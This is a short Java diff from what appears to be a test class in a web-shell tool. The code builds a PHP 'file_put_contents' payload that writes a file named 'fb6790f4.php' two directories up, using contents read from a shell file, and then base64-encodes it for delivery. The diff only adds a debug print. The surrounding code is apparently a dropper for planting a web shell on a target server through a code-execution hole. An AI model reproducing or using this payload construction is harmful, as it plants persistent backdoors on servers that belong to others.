@@ -13,6 +13,7 @@ public class SimpleTest {
         try {
             BASE64Encoder encoder = new BASE64Encoder();
             String text = "file_put_contents('../../fb6790f4.php','" + shell.readFile(shell.Phppath) +"');";
+             System.out.println(text);
             byte[] textByte = text.getBytes("UTF-8");
             String encodedText = encoder.encode(textByte).replace("\r\n","");
             System.out.println(encodedText);
